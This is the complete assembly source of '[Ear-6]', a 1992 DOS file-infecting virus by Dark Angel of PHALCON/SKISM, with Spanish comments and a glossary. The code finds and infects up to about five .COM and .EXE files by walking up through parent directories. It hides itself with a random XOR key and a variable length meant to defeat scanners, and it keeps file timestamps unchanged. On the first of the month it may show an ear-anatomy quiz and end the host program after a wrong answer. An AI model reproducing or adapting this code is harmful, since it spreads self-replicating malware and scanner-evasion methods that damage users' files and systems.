
; [Ear-6]

; El virus de oreja y o¡do seis
; Fue escrito por Dark Angel de PHALCON/SKISM
; Yo (el  ngel oscuro) escrib¡ este programa hace muchas semanas.
; No deba modificar este programa y da a otras personas COMO SI
; estar  el suyo.

; ¨D¢nde est  mi llama, mama?

;                       diccionarito
; espa¤ol       ingl‚s                   magnitud      size
; abre          open                     mango         handle
; aprueba       pass (a test)            m scara       mask
; atras         back                     mensaje       message
; azado         random                   mes           month
; busca         find                     mont¢n        heap
; cierra        close                    oreja, o¡do   ear
; cifra         code, encrypt, decrypt   pila          stack
; codo          pointer                  pregunta      question
; corto         terse, short             primer        first
; empieza       begin                    remendar      patch
; escriba       write                    renuncia      reject
; espa¤ol       ingl‚s                   respuesta     answer
; fecha         date                     salta         exit
; ficha         file                     siguiente     following, next
; ¡ndice        table                    suspende      fail (a test)
; ¨le gusta?    do you like?             termina       end
; longitud      length                   virus         virus (!)

.model tiny
.code
org     100h

longitud_del_virus = TerminaVir - EmpezarVir
longitud_del_escribir = offset termina_escribir - offset escribir

id = 'GH'                                       ; Representa el l¡der de
						; PHALCON/SKISM, Garbageheap
Empezar:  db      0e9h, 0, 0                    ; jmp EmpezarVir

EmpezarVir:
shwing:
remendar1:
	mov     bx, offset EmpezarCifra
remendar2:
	mov     cx, ((longitud_del_virus + 1) / 2)
hacia_atras:    ; atr s
	db      2eh
remendar3:
	db      81h, 37h, 0, 0                  ; xor word ptr cs:[bx], 0
	add     bx, 2
	loop    hacia_atras
EmpezarCifra:

	call    siguiente                       ; Es estupido, pero es corto
siguiente:
	pop     bp
	sub     bp, offset siguiente

	mov     byte ptr [bp+numinf], 0

	cld                                     ; No es necessario, pero
						; ¨por qu‚ no?
	cmp     sp, id
	jz      SoyEXE
SoyCOM: mov     di, 100h
	push    di
	lea     si, [bp+Primer3]
	movsb
	jmp     short SoyNada
SoyEXE: push    ds
	push    es
	push    cs
	push    cs
	pop     ds
	pop     es

	lea     di, [bp+EXE_Donde_JMP]  ; el CS:IP original de la ficha
	lea     si, [bp+EXE_Donde_JMP2] ; infectada
	movsw
	movsw
	movsw

	jmp     short SoyNada

NombreDelVirus  db  0,'[Ear-6]',0               ; En ingl‚s, ­por supuesto!
NombreDelAutor  db  'Dark Angel',0

SoyNada:
	movsw

	mov     ah, 1ah                         ; Esindicece un DTA nuevo
	lea     dx, [bp+offset nuevoDTA]        ; porque no quiere destruir
	int     21h                             ; el DTA original

	mov     ax, word ptr [bp+remendar1+1]
	mov     word ptr [bp+tempo], ax

	mov     ah, 47h                         ; Obtiene el directorio
	xor     dl, dl                          ; presente
	lea     si, [bp+diroriginal]
	int     21h

looper:
	lea     dx, [bp+offset mascara1]        ; "m scara", no "mascara"
	call    infectar_mascara                ; pero no es possible usar
						; acentos en MASM/TASM.
						; ­Qu‚ l stima!
						; mascara1 es '*.EXE',0
	lea     dx, [bp+offset mascara2]        ; mascara2 es '*.COM',0
	call    infectar_mascara                ; infecta las fichas de COM

	cmp     byte ptr [bp+numinf], 5         ; ¨Ha infectada cinco fichas?
	jg      saltar                          ; Si es verdad, no necesita
						; busca m s fichas.
	mov     ah, 3bh                         ; Cambia el directorio al
	lea     dx, [bp+puntos]                 ; directorio anterior
	int     21h                             ; ('..', 'punto punto')
	jnc     looper

saltar: lea     dx, [bp+backslash]              ; Cambia el directorio al
	mov     ah, 3bh                         ; directorio terminado.
	int     21h

	mov     ah, 2ah                         ; Activa el primer de
	int     21h                             ; cada mes
	cmp     dl, 1                           ; Si no es el primer,
	jnz     saltarahora                     ; ­saltar ahora! (duh-o)

	mov     ah, 2ch                         ; ¨Qu‚ hora es?
	int     21h

	cmp     dl, 85                          ; 85% probabilidad de
	jg      saltarahora                     ; activaci¢n

	and     dx, 7                           ; Un n£mero quasi-azado
	shl     dl, 1                           ; Usalo para determinar
	mov     bx, bp                          ; que preguntar  la virus
	add     bx, dx
	mov     dx, word ptr [bx+indice]        ; ¡ndice para el examencito
	add     dx, bp
	inc     dx
	push    dx                              ; Salva el codo al pregunta

	mov     ah, 9                           ; Escriba el primer parte de
	lea     dx, [bp+mensaje]                ; la pregunta
	int     21h

	pop     dx                              ; Escriba el parte de la oreja
	int     21h                             ; o el o¡do
	dec     dx
	push    dx                              ; Salva la respuesta correcta

	lea     dx, [bp+secciones]              ; Escriba los secciones de la
	int     21h                             ; oreja y el o¡do

trataotrarespuesta:
	mov     ah, 7                           ; Obtiene la respuesta de la
	int     21h                             ; "v¡ctima"
	cmp     al, '1'                         ; Necesita una respuesta de
	jl      trataotrarespuesta              ; uno hasta tres
	cmp     al, '3'                         ; Renuncia otras respuestas
	jg      trataotrarespuesta

	int     29h                             ; Escriba la respuesta

	pop     bx                              ; El codo al respuesta
						; correcta
	mov     ah, 9                           ; Prepara a escribir un
						; mensaje
	cmp     al, byte ptr [bx]               ; ¨Es correcta?
	jz      saltarapidamente                ; l aprueba el examencito.
						; Pues, salta r pidamente.
	lea     dx, [bp+suspendido]             ; Lo siento, pero ­Ud. no
	int     21h                             ; aprueba el examencito f cil!

	mov     ah, 4ch                         ; Estudie m s y el programa
	jmp     quite                           ; permitir  a Ud a continuar.

saltarapidamente:
	lea     dx, [bp+aprueba]
	int     21h
saltarahora:
	mov     ah, 1ah                         ; Restaura el DTA original
	mov     dx, 80h
quite:
	cmp     sp, id - 4                      ; ¨Es EXE o COM?
	jz      vuelvaEXE
vuelvaCOM:
	int     21h                             ; Restaura el DTA y vuelva
	retn                                    ; a la ficha original de COM

vuelvaEXE:
	pop     es
	pop     ds                              ; ds -> PSP

	int     21h

	mov     ax, es
	add     ax, 10h                         ; Ajusta para el PSP
	add     word ptr cs:[bp+EXE_Donde_JMP+2], ax
	cli
	add     ax, word ptr cs:[bp+PilaOriginal+2]
	mov     ss, ax
	mov     sp, word ptr cs:[bp+PilaOriginal]
	sti
	db      0eah                            ; JMP FAR PTR SEG:OFF
EXE_Donde_JMP dd 0
PilaOriginal  dd 0

EXE_Donde_JMP2  dd 0
PilaOriginal2   dd 0

infectar_mascara:
	mov     ah, 4eh                         ; Busca la ficha primera
	mov     cx, 7                           ; Cada atributo
brb_brb:
	int     21h
	jc      hasta_la_vista_bebe             ; No la busca

	xor     al, al
	call    abrir                           ; Abre la ficha

	mov     ah, 3fh
	mov     cx, 1ah
	lea     dx, [bp+buffer]
	int     21h

	mov     ah, 3eh                         ; Cierra la ficha
	int     21h

	lea     si,[bp+nuevoDTA+15h]            ; Salva cosas sobre la ficha
	lea     di,[bp+f_atrib]                 ; Por ejemplo, la fecha de
	mov     cx, 9                           ; creaci¢n
	rep     movsb

	cmp     word ptr [bp+buffer], 'ZM'      ; ¨Es EXE o COM?
	jz      buscaEXE
buscaCOM:
	mov     ax, word ptr [bp+f_long]        ; ¨Cuan grande es la ficha?
	sub     ax, longitud_del_virus + 3      ; Adjusta para el JMP
	cmp     ax, word ptr [bp+buffer+1]      ; ¨Ya es infectada?
	jnz     infecta_mi_burro                ; "infect my ass"
	jmp     short BuscaMas
buscaEXE:
	cmp     word ptr [bp+buffer+10h], id
	jnz     infecta_mi_burro
BuscaMas:
	mov     ah, 4fh                         ; Busca otra ficha...
	jmp     short brb_brb
hasta_la_vista_bebe:                            ; ¨Le gusta Arnold?
	ret

infecta_mi_burro:
	; AX = longitud de la ficha infectada
	lea     si, [bp+buffer]

	cmp     word ptr [si], 'ZM'
	jz      InfectaEXE
InfectaCOM:
	push    ax

	mov     cx, word ptr [bp+tempo]
	mov     word ptr [bp+remendar1+1], cx

	lea     di, [bp+Primer3]
	movsb
	push    si
	movsw

	mov     byte ptr [bp+buffer], 0e9h
	pop     di
	add     ax, longitud_del_virus
	stosw

	mov     cx, 3
	jmp     short   TerminaInfeccion
InfectaEXE:
	les     ax, [si+14h]                    ; Salva el original empieza
	mov     word ptr [bp+EXE_Donde_JMP2], ax; CS:IP de la ficha infectada
	mov     word ptr [bp+EXE_Donde_JMP2+2], es

	les     ax, [si+0Eh]                    ; Salva la original locaci¢n
	mov     word ptr [bp+PilaOriginal2], es ; de la pila
	mov     word ptr [bp+PilaOriginal2+2], ax

	mov     ax, word ptr [si + 8]
	mov     cl, 4
	shl     ax, cl
	xchg    ax, bx

	les     ax, [bp+offset nuevoDTA+26]
	mov     dx, es
	push    ax
	push    dx

	sub     ax, bx
	sbb     dx, 0

	mov     cx, 10h
	div     cx

	mov     word ptr [si+14h], dx           ; Nuevo empieza CS:IP
	mov     word ptr [si+16h], ax

	mov     cl, 4
	shr     dx, cl
	add     ax, dx
	mov     word ptr [si+0Eh], ax           ; y SS:SP
	mov     word ptr [si+10h], id

	pop     dx                              ; Restaura el magnitud de
	pop     ax                              ; la ficha

	add     ax, longitud_del_virus          ; A¤ada el magnitud del virus
	adc     dx, 0
	mov     cl, 9
	push    ax
	shr     ax, cl
	ror     dx, cl
	stc
	adc     dx, ax
	pop     ax
	and     ah, 1

	mov     word ptr [si+4], dx             ; Nuevo magnitud de la ficha
	mov     word ptr [si+2], ax

	push    cs
	pop     es

	mov     ax, word ptr [si+14h]
	sub     ax, longitud_del_virus + offset Empezarvir
	push    ax

	mov     cx, 1ah
TerminaInfeccion:
	mov     al, 2
	call    abrir

	mov     ah, 40h
	lea     dx, [bp+buffer]
	int     21h

	mov     ax, 4202h
	xor     cx, cx
	cwd                                     ; xor dx,dx
	int     21h

	mov     ah, 2ch                         ; N£meros azados en CX y DX
	int     21h
	mov     word ptr [bp+remendar3+2], cx   ; Es el nuevo n£mero de la
						; cifra
	and     cx, 31                          ; Pone un n£mero azado para el
	add     cx, ((longitud_del_virus + 1) / 2); magnitud de la ficha.  Por
						; eso, los scanners necesitan
	mov     word ptr [bp+remendar2+1], cx   ; usar "wildcards"
        lea     di, [bp+longitud_del_escribir]
	mov     al, 53h                         ; push bx
	stosb                                   ; (no destruir el mango de la
						;  ficha)
	lea     si, [bp+shwing]                 ; Copia las instrucciones
	push    si                              ; para formar la cifra
	mov     cx, longitud_de_la_cifra
	push    cx
	rep     movsb

	mov     al, 5bh                         ; pop bx
	stosb                                   ; (recuerda mango de la ficha)

	lea     si, [bp+escribir]               ; Copia las instrucciones
        mov     cx, longitud_del_escribir       ; para a¤ada el virus a la
	rep     movsb                           ; ficha

	mov     al, 53h                         ; push bx
	stosb

	pop     cx                              ; Copia las instrucciones
	pop     si                              ; para invalidar la cifra
	rep     movsb
	mov     ax, 0c35bh                      ; pop bx, retn
	stosw

	pop     ax

	; Codo del comienzo de la cifra
	add     ax, offset EmpezarCifra + longitud_del_virus
	mov     word ptr [bp+remendar1+1], ax

	call    antes_del_tempstore

	mov     ax, 5701h                       ; BX = mango de la ficha
	mov     dx, word ptr [bp+f_fecha]
	mov     cx, word ptr [bp+f_hora]
	int     21h                             ; Restaura fecha y hora

	mov     ah, 3eh
	int     21h

	xor     ch, ch
	mov     cl, byte ptr [bp+f_atrib]
	mov     ax, 4301h
	lea     dx, [bp+offset nuevoDTA + 30]     ; Busca un ficha en el DTA
	int     21h

	inc     byte ptr [bp+numinf]

	jmp     BuscaMas

Primer3  db 0CDh, 20h, 0
puntos   db '..',0
mascara1 db '*.EXE',0
mascara2 db '*.COM',0

abrir:  mov     ah, 3dh                         ; Abrir un ficha
	lea     dx, [bp+nuevoDTA+30]            ; Nombre de la ficha es en
	int     21h                             ; el DTA
	xchg    ax, bx
	ret

indice  dw      offset oreja1, offset oreja2, offset oreja3, offset oreja4
	dw      offset oreja5, offset oreja6, offset oreja4, offset oreja1
oreja1  db      '1','Auditory Canal$'
oreja2  db      '1','Lobe$'
oreja3  db      '2','Anvil$'
oreja4  db      '2','Eustachian Tube$'
oreja5  db      '3','Auditory Nerve$'
oreja6  db      '3','Cochlea$'

mensaje db      'PHALCON/SKISM 1992 [Ear-6] Alert!',13,10,'Where is the $'
secciones db    ' located?',13,10
	db      ' 1. External Ear',13,10
	db      ' 2. Middle Ear',13,10
	db      ' 3. Inner Ear',13,10,'( )',8,8,'$'

; No es bueno.
suspendido db   13,10,'You obviously know nothing about ears.'
	db      13,10,'Try again after some study.',13,10,'$'

; ­Espero que s¡!
aprueba db      13,10,'Wow, you know your ears!  Please resume work.',13,10
	db      '$'

escribir:
	mov     ah, 40h
	mov     cx, TerminaVir - EmpezarVir
	lea     dx, [bp+EmpezarVir]
	int     21h
termina_escribir:

backslash db '\'

TerminaVir = $

; Los que sigue son en el mont¢n...
longitud_de_la_cifra = offset EmpezarCifra - offset shwing

diroriginal db 64 dup (?)
tempo       dw ?
nuevoDTA    db 43 dup (?)
numinf      db ?
antes_del_tempstore:
; tempstore es el buffer para el parte del programa que a¤ada el virus al fin
; de otro programa
						; a¤ada cinco para los pop,
						; los push, y el retn
buffer      db 1ah dup (?)
f_atrib     db      ?                           ; atributo de la ficha
f_hora      dw      ?                           ; hora de creaci¢n
f_fecha     dw      ?                           ; fecha de creaci¢n
f_long      dd      ?                           ; magnitud de la ficha

	end     Empezar
